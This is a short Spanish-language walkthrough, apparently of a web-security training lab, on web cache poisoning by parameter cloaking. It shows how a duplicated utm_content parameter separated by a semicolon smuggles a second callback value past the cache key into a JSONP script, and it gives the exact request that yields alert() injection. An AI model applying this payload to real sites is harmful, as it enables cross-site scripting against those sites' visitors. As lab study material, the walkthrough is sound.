---
title: "7 - Parameter cloaking"
---

# 7 - Parameter cloaking

Sacamos con el param miner que el parámetro por GET : utm_content es unkeyed.


Cuando enviamos :

```
GET /?utm_content=xss&cb=1234
```

```
Set-Cookie: utm_content=xss;
```

Observamos que en `GET /js/geolocate.js` podemos controlar el parámetro callback que se refleja en :

```javascript
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
AQUÍ({"country":"United Kingdom"});
```

`GET /js/geolocate.js?callback=alert()//` 

```javascript
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert()//({"country":"United Kingdom"});
```

La cosa es que cachear la request de arriba no nos vale para hacer que la víctima ejecuta la alerta, porque la víctima no va a cargar una respuesta cacheada si no hace una solicitud a `GET /js/geolocate.js?callback=alert()//`

### Podemos usar find **rails param cloacking scanner** 

Que nos automatiza buscar parámetros parseados de distinta forma entre la caché y el backend.

Nos ha encontrado que si hacemos :

```http
GET /?utm_content=oxwyy8&utm_content=x;oxwyy8=akzldka&r3zxm7258=1
```

```http
GET /?utm_content=oxwyy8&r3zxm7258=1
```

```HTML
HIT

<link rel="canonical" href='//0ac4005e03a5a787803af3fa00a50045.web-security-academy.net/?utm_content=oxwyy8&amp;utm_content=x;oxwyy8=akzldka&amp;r3zxm7258=1'/>
```

Es decir que si pones dos utm_content no se incluyen los dos en la cache key y a continuación probaremos también que oxwyy8 se interpretará como otro argumento de la url por el backend


Asi que

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert()//

Nos devolverá 
```javascript
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert()//({"country":"United Kingdom"});
```
